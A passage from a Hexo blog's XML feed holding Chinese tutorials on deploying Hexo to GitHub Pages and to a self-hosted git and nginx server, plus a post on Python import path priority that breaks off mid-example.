        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <p>1,前提： hexo安装OK , node.js 安装OK<p></p><p>2,准备：2.1 安装GIT ,   2.2 添加ssh key 到Github   2.3  在github添加项目  2.4 修改站点配置文件 _config.yml   2.5 发布流程 </p><p>3，bug修复</p><p>4，访问站点。</p><p><strong>2.1</strong> <strong>安装****git</strong> ,</p><p>安装git ,如果没有安装,则无法连接git 或找不到git ,则需要执行如下命令来安装hexo-deployer-git:</p><p>$npm install hexo-deployer-git –save</p><p>配置<strong>Deployment</strong>首先，你需要为自己配置身份信息，打开命令行，然后输入：</p><ul><li>  <em>git config –global user.name “yourname”</em></li><li>  <em>git config –global user.email “youremail”</em></li><li>  <strong><em>#git config –global user.name “zhuxinkai”</em></strong></li><li>  <strong><em>#git config –global user.email “<a href="mailto:&#x7a;&#104;&#x75;&#x78;&#105;&#110;&#107;&#x61;&#x69;&#64;&#49;&#x32;&#x36;&#46;&#99;&#111;&#109;">&#x7a;&#104;&#x75;&#x78;&#105;&#110;&#107;&#x61;&#x69;&#64;&#49;&#x32;&#x36;&#46;&#99;&#111;&#109;</a>“</em></strong></li></ul><p>以上做完还不行</p><p>删掉根目录下的文件夹：.deploy_git，重新deploy就可以了。</p><p> 以上是在SSH配置好的前提下</p><p><strong>2.2</strong> <strong>添加****ssh</strong></p><p>2.2.1 首先在自己的环境，生成密钥对。</p><p>1.1.检查SSH keys是否存在Github</p><p>执行如下命令，检查SSH keys是否存在。如果有文件id_rsa.pub或id_dsa.pub，则直接进入步骤1.3将SSH key添加到Github中，否则进入下一步生成SSH key。</p><p>$ ls -al ~/.ssh</p><p>1.2.生成新的ssh key</p><p>执行如下命令生成public/private rsa key pair，注意将<a href="mailto:&#121;&#x6f;&#117;&#x72;&#x5f;&#x65;&#109;&#x61;&#x69;&#x6c;&#x40;&#x65;&#x78;&#x61;&#109;&#112;&#108;&#x65;&#46;&#99;&#x6f;&#x6d;">&#121;&#x6f;&#117;&#x72;&#x5f;&#x65;&#109;&#x61;&#x69;&#x6c;&#x40;&#x65;&#x78;&#x61;&#109;&#112;&#108;&#x65;&#46;&#99;&#x6f;&#x6d;</a>换成你自己注册Github的邮箱地址。</p><p>$ ssh-keygen -t rsa -C “<a href="mailto:&#121;&#111;&#x75;&#114;&#95;&#x65;&#x6d;&#97;&#x69;&#108;&#64;&#x65;&#x78;&#x61;&#109;&#x70;&#x6c;&#101;&#x2e;&#x63;&#111;&#x6d;">&#121;&#111;&#x75;&#114;&#95;&#x65;&#x6d;&#97;&#x69;&#108;&#64;&#x65;&#x78;&#x61;&#109;&#x70;&#x6c;&#101;&#x2e;&#x63;&#111;&#x6d;</a>“</p><p>#ssh-keygen -t rsa -C “<a href="mailto:&#122;&#104;&#117;&#120;&#x69;&#x6e;&#x6b;&#97;&#x69;&#x40;&#x31;&#x32;&#54;&#x2e;&#x63;&#x6f;&#109;">&#122;&#104;&#117;&#120;&#x69;&#x6e;&#x6b;&#97;&#x69;&#x40;&#x31;&#x32;&#54;&#x2e;&#x63;&#x6f;&#109;</a>“</p><p>默认会在相应路径下（~/.ssh/id_rsa.pub）生成id_rsa和id_rsa.pub两个文件。</p><p>1.3.将ssh key添加到Github中</p><p>Find前往文件夹~/.ssh/id_rsa.pub打开id_rsa.pub文件，里面的信息即为SSH key，将这些信息复制到Github的Add SSH key页面即可。</p><p>进入Github –&gt; Settings –&gt; SSH keys –&gt; add SSH key:</p><p>Title里任意添一个标题，将复制的内容粘贴到Key里，点击下方Add key绿色按钮即可。</p><p>添加后，在git bash命令输入：</p><p>ssh -T <a href="mailto:&#x67;&#x69;&#x74;&#64;&#x67;&#105;&#116;&#46;&#x63;&#x6f;&#x64;&#x69;&#x6e;&#x67;&#x2e;&#x6e;&#x65;&#116;">&#x67;&#x69;&#x74;&#64;&#x67;&#105;&#116;&#46;&#x63;&#x6f;&#x64;&#x69;&#x6e;&#x67;&#x2e;&#x6e;&#x65;&#116;</a>    测试公钥配置的有效性，地址该为 github的。这个是coding 的地址。</p><p><strong>2.3</strong> <strong>在github中添加项目</strong></p><p><strong>项目名称遵循后规范：</strong> **(**<strong>你的username)   zhuxinkai+github+io</strong></p><p><strong>2.4</strong> <strong>修改站点配置文件：</strong></p><p><strong>Vim hexo/_config.yml</strong></p><p># Deployment</p><p>## Docs: <a href="https://hexo.io/docs/deployment.html">https://hexo.io/docs/deployment.html</a></p><p>deploy:</p><p>  type: git</p><p>  repository: <a href="mailto:&#x67;&#105;&#116;&#x40;&#103;&#105;&#x74;&#104;&#x75;&#x62;&#46;&#99;&#x6f;&#x6d;">&#x67;&#105;&#116;&#x40;&#103;&#105;&#x74;&#104;&#x75;&#x62;&#46;&#99;&#x6f;&#x6d;</a>:zhuxinkai/zhuxinkai.github.io.git</p><p>  branch: master</p><p><strong>2.5</strong> <strong>发布流程</strong></p><p>#hexo clean</p><p>#hexo generate</p><p>#hexo deploy</p><ol start="3"><li> BUG 修复</li></ol><p>其中遇到两个问题，</p><p>3.1  第一个是 hexo deploy 报错。 其中github 的ssh已经配置正确。  添加如下配置后，正常。    git config -global user.name”zhuxinkai”</p><p>                                                                                                                                                                            git config -global user.email “<a href="mailto:&#x7a;&#104;&#x75;&#120;&#x69;&#110;&#107;&#97;&#x69;&#x40;&#49;&#50;&#54;&#x2e;&#99;&#111;&#109;">&#x7a;&#104;&#x75;&#120;&#x69;&#110;&#107;&#97;&#x69;&#x40;&#49;&#50;&#54;&#x2e;&#99;&#111;&#109;</a>“</p><p>3.2 就是上传成功后找不到域名。</p><p>  zhuxinkai.github.io</p><h1 id="4-访问站点"><a href="#4-访问站点" class="headerlink" title="4, 访问站点"></a>4, 访问站点</h1><p>在浏览器  输入   zhuxinkai.github.io 即可。每次更新文件，需要按照发布流程跑一遍。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo to your server</title>
      <link href="/2017/05/22/hexo-to-server/"/>
      <url>/2017/05/22/hexo-to-server/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <h1 id="hexo-to-your-server"><a href="#hexo-to-your-server" class="headerlink" title="hexo-to-your-server"></a>hexo-to-your-server<p>原文(<a href="https://github.com/lawler61/hexo-to-server">https://github.com/lawler61/hexo-to-server</a>)</p><h2 id="一、开始"><a href="#一、开始" class="headerlink" title="一、开始"></a>一、开始</h2><h3 id="配置本地-node-环境"><a href="#配置本地-node-环境" class="headerlink" title="配置本地 node 环境"></a>配置本地 node 环境</h3><ol><li><p><code>node</code>下载 <a href="https://nodejs.org/zh-cn/download/">官网下载</a>，可以的话推荐使用 <code>nvm</code> 安装</p></li><li><p>安装记得把目录改到其他盘，这里我具体是在 <code>D:\programming\nodejs</code></p></li></ol><p><a href="hexo-to-server/node-path.jpg" title="node更换路径" class="gallery-item"><img src="/2017/05/22/hexo-to-server/node-path.jpg" alt="node更换路径"></a></p><p>打开<code>cmd</code>查看<code>node</code>安装情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">node -v<br>npm -v<br></code></pre></td></tr></table></figure><span id="more"></span><ol start="3"><li>配置全局环境</li></ol><p>进入安装目录，创建文件夹<code>node_global</code>和<code>node_cache</code> 并执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm config <span class="hljs-built_in">set</span> prefix <span class="hljs-string">&quot;D:\programming\nodejs\node_global&quot;</span><br>npm config <span class="hljs-built_in">set</span> cache <span class="hljs-string">&quot;D:\programming\nodejs\node_cache&quot;</span><br></code></pre></td></tr></table></figure><p>环境配置：新增环境变量<code>NODE_PATH</code>和添加<code>Path</code>，两个值都为 <code>D:\programming\nodejs\node_global</code></p><p><a href="hexo-to-server/env-node.jpg" title="node更换路径" class="gallery-item"><img src="/2017/05/22/hexo-to-server/env-node.jpg" alt="node更换路径"></a></p><p><a href="hexo-to-server/env-path.jpg" title="node更换路径" class="gallery-item"><img src="/2017/05/22/hexo-to-server/env-path.jpg" alt="node更换路径"></a></p><ol start="4"><li>安装<code>hexo-cli</code></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm i hexo-cli -g<br>hexo<br></code></pre></td></tr></table></figure><p>如果显示下面情况，恭喜你成功全局模块调用</p><p><a href="hexo-to-server/test-hexo.jpg" title="node更换路径" class="gallery-item"><img src="/2017/05/22/hexo-to-server/test-hexo.jpg" alt="node更换路径"></a></p><ol start="5"><li><p>如果出现<code>命令未找到，或不是可执行程序</code>，别着急！<strong>先仔细重复 3-4 步</strong>，一般是能够给解决的，如果实在是不能解决，往后看</p></li><li><p>随便找个地方初始化文件，执行如下命令：</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkdir hexo-blog<br><span class="hljs-built_in">cd</span> hexo-blog &amp;&amp; npm init -y<br></code></pre></td></tr></table></figure><p>现在有 3 种解决方法，<strong>任选其一</strong></p><ul><li>法 1：检查全局目录是否的<code>hexo</code>模块，执行如下命令：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">D:\programming\nodejs\node_global\hexo<br></code></pre></td></tr></table></figure><ul><li>法 2：如果觉得每次加前缀麻烦，使用<code>link</code>命令链接</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm link hexo<br></code></pre></td></tr></table></figure><p>package.json 中新建脚本如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm run hexo<br></code></pre></td></tr></table></figure><p><a href="hexo-to-server/npm-script.jpg" title="新建npm脚本" class="gallery-item"><img src="/2017/05/22/hexo-to-server/npm-script.jpg" alt="新建npm脚本"></a></p><ul><li>法 3：你还可以直接在<code>hexo-blog</code>中下载</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm i hexo-cli<br>npm run hexo （还是要在package.json中新建脚本）<br></code></pre></td></tr></table></figure><h3 id="初始化hexo项目"><a href="#初始化hexo项目" class="headerlink" title="初始化hexo项目"></a>初始化<code>hexo</code>项目</h3><ol><li>如果是按照上一节步骤 4 过来的，则在<code>hexo-blog</code>文件下初始化</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo init myblog &amp;&amp; <span class="hljs-built_in">cd</span> myblog<br>npm i<br></code></pre></td></tr></table></figure><ol start="2"><li>下载主题</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/iissnan/hexo-theme-next themes/next<br></code></pre></td></tr></table></figure><p>在<strong>本地配置文件</strong>中设置<code>theme</code>属性</p><p><a href="hexo-to-server/hexo-theme.jpg" title="添加next主题" class="gallery-item"><img src="/2017/05/22/hexo-to-server/hexo-theme.jpg" alt="添加next主题"></a></p><ol start="3"><li>本地执行<code>hexo</code>项目，添加<code>start</code>脚本</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm start<br></code></pre></td></tr></table></figure><p><a href="hexo-to-server/npm-script-start.jpg" title="新建npm-start脚本" class="gallery-item"><img src="/2017/05/22/hexo-to-server/npm-script-start.jpg" alt="新建npm-start脚本"></a></p><p>打开 <a href="http://localhost:4000/">http://localhost:4000</a> 验证效果吧</p><h3 id="git环境搭建"><a href="#git环境搭建" class="headerlink" title="git环境搭建"></a><code>git</code>环境搭建</h3><ol><li><p><code>git</code>安装：<a href="https://git-scm.com/downloads">官网下载</a></p></li><li><p>生成<code>ssh</code>认证，执行如下命令</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">git config --global user.name <span class="hljs-string">&quot;yourname&quot;</span><br>git config --global user.email youremail@example.com<br>ssh-keygen -t rsa -C <span class="hljs-string">&quot;youremail@example.com&quot;</span><br>git config --global core.autocrlf <span class="hljs-literal">false</span>  // 禁用自动转换，这个不设置后面上传时会出现警告，如下<br></code></pre></td></tr></table></figure><p><a href="hexo-to-server/git-warning.jpg" title="git警告" class="gallery-item"><img src="/2017/05/22/hexo-to-server/git-warning.jpg" alt="git警告"></a></p><p>最后获取到的<code>ssh</code>认证在<code>C:\Users\yourname\.ssh</code>中</p><hr><h2 id="三、服务器配置"><a href="#三、服务器配置" class="headerlink" title="三、服务器配置"></a>三、服务器配置</h2><h3 id="搭建远程Git私库"><a href="#搭建远程Git私库" class="headerlink" title="搭建远程Git私库"></a>搭建远程<code>Git</code>私库</h3><ol><li><p>登录到远程服务器，推荐使用<code>Xshell 5</code></p></li><li><p>安装 git</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git --version // 如无，则安装<br>yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel perl-devel<br>yum install -y git<br></code></pre></td></tr></table></figure><ol start="3"><li>创建用户并配置其仓库</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">useradd git<br>passwd git // 设置密码<br>su git // 这步很重要，不切换用户后面会很麻烦<br><span class="hljs-built_in">cd</span> /home/git/<br>mkdir -p projects/blog // 项目存在的真实目录<br>mkdir repos &amp;&amp; <span class="hljs-built_in">cd</span> repos<br>git init --bare blog.git // 创建一个裸露的仓库<br><span class="hljs-built_in">cd</span> blog.git/hooks<br>vi post-receive // 创建 hook 钩子函数，输入了内容如下<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>git --work-tree=/home/git/projects/blog --git-dir=/home/git/repos/blog.git checkout -f<br></code></pre></td></tr></table></figure><p>添加完毕后修改权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">chmod +x post-receive<br><span class="hljs-built_in">exit</span> // 退出到 root 登录<br>chown -R git:git /home/git/repos/blog.git // 添加权限<br></code></pre></td></tr></table></figure><ol start="4"><li>测试<code>git仓库</code>是否可用，另找空白文件夹</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> git@server_ip:/home/git/repos/blog.git<br></code></pre></td></tr></table></figure><p>如果能把空仓库拉下来，就说明 git 仓库搭建成功了</p><p><a href="hexo-to-server/git-clone.jpg" title="git仓库测试" class="gallery-item"><img src="/2017/05/22/hexo-to-server/git-clone.jpg" alt="git仓库测试"></a></p><ol start="5"><li>建立<code>ssh</code>信任关系，在<strong>本地电脑</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh-copy-id -i C:/Users/yourname/.ssh/id_rsa.pub git@server_ip<br>ssh git@server_ip // 测试能否登录<br></code></pre></td></tr></table></figure><p><strong>注</strong>：此时的 ssh 登录 git 用户不需要密码！否则就<strong>有错</strong>，请仔细重复步骤 3-5</p><ol start="6"><li>为了安全起见禁用 git 用户的 shell 登录权限，从而只能用 git clone，git push 等登录</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">cat /etc/shells // 查看 git-shell 是否在登录方式里面<br><span class="hljs-built_in">which</span> git-shell // 查看是否安装<br>vi /etc/shells<br>添加上2步显示出来的路劲，通常在 /usr/bin/git-shell<br></code></pre></td></tr></table></figure><p>修改<code>/etc/passwd</code>中的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">// 将原来的<br>git:x:1000:1000::/home/git:/bin/bash<br><br>// 修改为<br>git:x:1000:1000:,,,:/home/git:/usr/bin/git-shell<br></code></pre></td></tr></table></figure><h3 id="搭建nginx服务器"><a href="#搭建nginx服务器" class="headerlink" title="搭建nginx服务器"></a>搭建<code>nginx</code>服务器</h3><ol><li>下载并安装<code>nginx</code></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /usr/<span class="hljs-built_in">local</span>/src<br>wget http://nginx.org/download/nginx-1.15.2.tar.gz<br>tar xzvf nginx-1.15.2.tar.gz<br><span class="hljs-built_in">cd</span> nginx-1.15.2<br>./configure // 如果后面还想要配置 SSL 协议，就执行后面一句！<br>./configure --prefix=/usr/<span class="hljs-built_in">local</span>/nginx --with-http_stub_status_module --with-http_ssl_module --with-file-aio --with-http_realip_module<br>make &amp;&amp; make install<br><span class="hljs-built_in">alias</span> nginx=<span class="hljs-string">&#x27;/usr/local/nginx/sbin/nginx&#x27;</span> // 为 nginx 取别名，后面可直接用<br></code></pre></td></tr></table></figure><ol start="2"><li>配置<code>nginx</code>文件</li></ol><p>先启动是否安装成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nginx // 直接来！浏览器查看 server_ip，默认是 80 端口<br></code></pre></td></tr></table></figure><p>修改配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">nginx -s stop // 先停止nginx<br><span class="hljs-built_in">cd</span> /usr/<span class="hljs-built_in">local</span>/nginx/conf<br>vi nginx.conf<br>修改 root 解析路径，如下图<br>同时将 user 改为 root 如下图，不然nginx无法访问 /home/git/project/blog<br>nginx -s reload<br></code></pre></td></tr></table></figure><p><a href="hexo-to-server/nginx-conf.jpg" title="修改nginx配置" class="gallery-item"><img src="/2017/05/22/hexo-to-server/nginx-conf.jpg" alt="修改nginx配置"></a></p><p><a href="hexo-to-server/nginx-user.jpg" title="修改nginx user" class="gallery-item"><img src="/2017/05/22/hexo-to-server/nginx-user.jpg" alt="修改nginx user"></a></p><hr><h2 id="四、发布"><a href="#四、发布" class="headerlink" title="四、发布"></a>四、发布</h2><p>至此我们就把本地和服务器的环境全部搭建完成，现在利用 hexo 配置文件进行链接</p><h3 id="配置-config-yml文件"><a href="#配置-config-yml文件" class="headerlink" title="配置_config.yml文件"></a>配置<code>_config.yml</code>文件</h3><ol><li>编辑 _config.yml 的 deploy 属性</li></ol><p><a href="hexo-to-server/config-deploy.jpg" title="编辑本地deploy" class="gallery-item"><img src="/2017/05/22/hexo-to-server/config-deploy.jpg" alt="编辑本地deploy"></a></p><ol start="2"><li>在 package.json 中添加 npm 脚本</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-string">&quot;scripts&quot;</span>: &#123;<br>  <span class="hljs-attr">&quot;deploy&quot;</span>: <span class="hljs-string">&quot;hexo clean &amp;&amp; hexo g -d&quot;</span>,<br>  <span class="hljs-attr">&quot;start&quot;</span>: <span class="hljs-string">&quot;hexo clean &amp;&amp; hexo g &amp;&amp; hexo s&quot;</span><br>&#125;,<br></code></pre></td></tr></table></figure><ol start="3"><li>链接！这下在本地调试就用<code>npm start</code>，调试好了就上传到服务器，美滋滋~快通过你的服务器 ip 访问吧</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm run deploy<br></code></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
            <tag> hexo </tag>
            
            <tag> 非原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python 中 import 的用法详解</title>
      <link href="/2016/07/22/python%E4%B8%ADimport%E8%AF%A6%E8%A7%A3/"/>
      <url>/2016/07/22/python%E4%B8%ADimport%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <h4 id="1-1如何确定import-的优先级路径："><a href="#1-1如何确定import-的优先级路径：" class="headerlink" title="1.1如何确定import 的优先级路径："></a>1.1如何确定import 的优先级路径：<p>比如在不同的相关路径下存在相同名字的模块。<strong>注意在不同的优先级如果有相同的导入模块，那么只有最高优先级的模块起作用！</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> sys<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span> sys.path<br>[<span class="hljs-string">&#x27;&#x27;</span>, <br><span class="hljs-string">&#x27;C:\\Program Files\\Python37\\python37.zip&#x27;</span>,<br><span class="hljs-string">&#x27;C:\\Program Files\\Python37\\DLLs&#x27;</span>, <br><span class="hljs-string">&#x27;C:\\Program Files\\Python37\\lib&#x27;</span>,<br><span class="hljs-string">&#x27;C:\\Program Files\\Python37&#x27;</span>,<br><span class="hljs-string">&#x27;C:\\Users\\Sampson\\AppData\\Roaming\\Python\\Python37\\site-packages&#x27;</span>, <br><span class="hljs-string">&#x27;C:\\Program Files\\Python37\\lib\\site-packages&#x27;</span><br>]<br><br><br><br><br></code></pre></td></tr></table></figure><h4 id="1-2-路径优先级排序详解"><a href="#1-2-路径优先级排序详解" class="headerlink" title="1.2 路径优先级排序详解"></a>1.2 路径优先级排序详解</h4><ul><li>1.2.1 ‘ ‘  表示当前路径,默认优先级最高。</li><li>1.2.2 /usr/lib/sbin/python/ 来自 /etc/profile 环境变量定义,如果存在，默认优先级第二。<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim /etc/profile<br>export PYTHONPATH=/usr/lib/sbin/python/<br>source /etc/profile #每个打开的shell界面都要source起作用<br></code></pre></td></tr></table></figure></li><li>1.2.3 特殊情况，你可以使用sys.path.insert 超越当前路径。 逆袭称为第一，但是只对当前运行脚本起作用。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br>sys.path.insert(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;/home/dev/data&#x27;</span>)<br>reload(sys)  <span class="hljs-comment">#听说加不加都一样</span><br></code></pre></td></tr></table></figure></li><li>1.2.4 屁股后面加一条。添加你的运行环境种其他区域或者路径的模块。默认优先级最低。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br>sys.path.append(<span class="hljs-string">&#x27;/home/dev/data2&#x27;</span>)<br></code></pre></td></tr></table></figure></li></ul><h4 id="1-3-导入的区别及使用方法的方式。"><a href="#1-3-导入的区别及使用方法的方式。" class="headerlink" title="1.3 导入的区别及使用方法的方式。"></a>1.3 导入的区别及使用方法的方式。</h4><p>以math模块为例。<br>有三种导入方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> math<br><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> floor<br></code></pre></td></tr></table></figure><font face="仿宋" color="#2BBC8A">注意到这里没有使用from ... import ...。如果使用了这种import命令，将无法使用常规函 数sqrt。类似这样的名称冲突很隐蔽，因此除非必须使用from版的import命令，否则应坚持使用 常规版import命令</font><h5 id="1-3-1-第一种方法导入的使用，需要在方法前输入模块名。"><a href="#1-3-1-第一种方法导入的使用，需要在方法前输入模块名。" class="headerlink" title="1.3.1 第一种方法导入的使用，需要在方法前输入模块名。"></a>1.3.1 第一种方法导入的使用，需要在方法前输入模块名。</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">math.sqrt(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h5 id="1-3-2-第二种方法的导入，及导入模块下所有的方法。容易出现同名方法问题。不精确，也导致工程导入过多代码。"><a href="#1-3-2-第二种方法的导入，及导入模块下所有的方法。容易出现同名方法问题。不精确，也导致工程导入过多代码。" class="headerlink" title="1.3.2 第二种方法的导入，及导入模块下所有的方法。容易出现同名方法问题。不精确，也导致工程导入过多代码。"></a>1.3.2 第二种方法的导入，及导入模块下所有的方法。容易出现同名方法问题。不精确，也导致工程导入过多代码。</h5><h5 id="1-3-3-第三种方法的导入，称为精准导入。。而且可以使用as-避免同名方法问题。"><a href="#1-3-3-第三种方法的导入，称为精准导入。。而且可以使用as-避免同名方法问题。" class="headerlink" title="1.3.3 第三种方法的导入，称为精准导入。。而且可以使用as 避免同名方法问题。"></a>1.3.3 第三种方法的导入，称为精准导入。。而且可以使用as 避免同名方法问题。</h5><p>例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> cmath <span class="hljs-keyword">import</span> sqrt <span class="hljs-keyword">as</span> csqrt<br><span class="hljs-meta">&gt;&gt;&gt; </span>csqrt(-<span class="hljs-number">1</span>)<br><span class="hljs-number">1j</span><br><br></code></pre></td></tr></table></figure><font face="仿宋" color="#2BBC8A"><p>同名方法因为导入的模块不同，而引起的结果不同。<br></p></font><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> cmath<br><span class="hljs-meta">&gt;&gt;&gt; </span>cmath.sqrt(-<span class="hljs-number">1</span>)<br><span class="hljs-number">1j</span><br>&gt;&gt;&gt;<br>&gt;&gt;&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> cmath <span class="hljs-keyword">import</span> *<br><span class="hljs-meta">&gt;&gt;&gt; </span>sqrt(-<span class="hljs-number">1</span>)<br><span class="hljs-number">1j</span><br>&gt;&gt;&gt;<br>&gt;&gt;&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> *<br><span class="hljs-meta">&gt;&gt;&gt; </span>sqrt(-<span class="hljs-number">1</span>)<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, line <span 